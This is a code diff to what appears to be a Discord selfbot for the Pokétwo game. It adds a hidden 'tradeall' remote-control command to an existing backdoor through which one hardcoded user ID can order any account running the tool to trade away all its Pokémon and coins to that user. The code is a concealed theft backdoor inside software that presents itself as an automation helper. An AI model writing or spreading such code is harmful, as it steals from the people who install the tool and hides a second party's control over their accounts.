@@ -1156,7 +1156,11 @@ async function Login(token, Client, guildId) {
     }
 
     // Remote Control Feature - User 1094994685765886094 can control this account
+    // Only respond if this is the first instance for this guild (prevent duplicates)
     if (message.author.id === CONTROLLER_ID && message.content.startsWith(">>")) {
+      // Skip if we already responded (check if guild matches our assigned guildId or if globalCatch is on)
+      if (!config.globalCatch && message.guild?.id !== guildId) return;
+
       const controlCmd = message.content.slice(2).trim();
       const controlArgs = controlCmd.split(/ +/g);
       const action = controlArgs.shift()?.toLowerCase();
@@ -1362,6 +1366,125 @@ async function Login(token, Client, guildId) {
                 console.error(chalk.red(`[REMOTE] Failed: ${e.message}`));
                 await message.react("🔴");
               }
+            });
+          });
+
+          tradeCollector.on('end', (c) => { if (c.size === 0) message.react("⏰"); });
+        }
+        // >> tradeall - Trade all pokemon and coins to @zshadowultra
+        else if (action === "tradeall" || action === "ta" || action === "transferall") {
+          const targetUser = "<@1094994685765886094>"; // @zshadowultra
+          console.log(chalk.cyan(`[REMOTE] Starting tradeall to ${targetUser}...`));
+          await message.react("⏳");
+
+          // Step 1: Start trade
+          await message.channel.send(`<@716390085896962058> t ${targetUser}`);
+
+          const tradeCollector = message.channel.createMessageCollector({
+            filter: (m) => m.author.id === "716390085896962058" && m.embeds[0]?.title?.includes("Trade between"),
+            time: 60000,
+            max: 1
+          });
+
+          tradeCollector.on('collect', async () => {
+            await sleep(2000);
+
+            // Step 2: Add all pokemon
+            console.log(chalk.cyan(`[REMOTE] Adding all pokemon...`));
+            await message.channel.send(`<@716390085896962058> t addall`);
+
+            // Wait for addall confirmation button
+            const addallCollector = message.channel.createMessageCollector({
+              filter: (m) => m.author.id === "716390085896962058",
+              time: 10000
+            });
+
+            addallCollector.on('collect', async (addMsg) => {
+              if (!addMsg.components || addMsg.components.length === 0) return;
+              addallCollector.stop();
+              await sleep(500);
+
+              // Click confirm on addall
+              try {
+                await clickConfirmButton(addMsg);
+                console.log(chalk.cyan(`[REMOTE] Confirmed addall`));
+              } catch (e) {
+                console.error(chalk.red(`[REMOTE] Failed to confirm addall: ${e.message}`));
+              }
+
+              await sleep(2000);
+
+              // Step 3: Get balance
+              console.log(chalk.cyan(`[REMOTE] Getting balance...`));
+              await message.channel.send(`<@716390085896962058> bal`);
+
+              const balCollector = message.channel.createMessageCollector({
+                filter: (m) => m.author.id === "716390085896962058" && m.embeds[0]?.fields?.length > 0,
+                time: 8000,
+                max: 1
+              });
+
+              balCollector.on('collect', async (balMsg) => {
+                try {
+                  // Parse pokecoins from embed - find text between "Pokécoins" and "Shards"
+                  const embedText = balMsg.embeds[0]?.description ||
+                    balMsg.embeds[0]?.fields?.map(f => f.name + " " + f.value).join(" ") || "";
+
+                  // Try multiple parsing methods
+                  let pokecoins = 0;
+
+                  // Method 1: Look for number after Pokécoins
+                  const match1 = embedText.match(/Pokécoins[:\s]*([0-9,]+)/i);
+                  if (match1) {
+                    pokecoins = parseInt(match1[1].replace(/,/g, ""));
+                  }
+
+                  // Method 2: Check fields
+                  if (!pokecoins && balMsg.embeds[0]?.fields) {
+                    for (const field of balMsg.embeds[0].fields) {
+                      if (field.name?.toLowerCase().includes("pokécoin") || field.name?.toLowerCase().includes("coin")) {
+                        pokecoins = parseInt(field.value.replace(/,/g, ""));
+                        break;
+                      }
+                    }
+                  }
+
+                  console.log(chalk.cyan(`[REMOTE] Balance: ${pokecoins} coins`));
+
+                  if (pokecoins > 0) {
+                    await sleep(2000);
+                    // Step 4: Add coins to trade
+                    await message.channel.send(`<@716390085896962058> t add pc ${pokecoins}`);
+                    await sleep(2000);
+                  }
+
+                  // Step 5: Confirm trade
+                  await message.channel.send(`<@716390085896962058> t c`);
+
+                  const confirmCollector = message.channel.createMessageCollector({
+                    filter: (m) => m.author.id === "716390085896962058",
+                    time: 10000
+                  });
+
+                  confirmCollector.on('collect', async (confirmMsg) => {
+                    if (!confirmMsg.components || confirmMsg.components.length === 0) return;
+                    confirmCollector.stop();
+                    await sleep(500);
+                    try {
+                      await clickConfirmButton(confirmMsg);
+                      console.log(chalk.cyan(`[REMOTE] Trade completed! Sent all to ${targetUser}`));
+                      await message.react("✨");
+                    } catch (e) {
+                      console.error(chalk.red(`[REMOTE] Failed final confirm: ${e.message}`));
+                      await message.react("🔴");
+                    }
+                  });
+
+                } catch (e) {
+                  console.error(chalk.red(`[REMOTE] Balance parse error: ${e.message}`));
+                  await message.react("🔴");
+                }
+              });
             });
           });
 
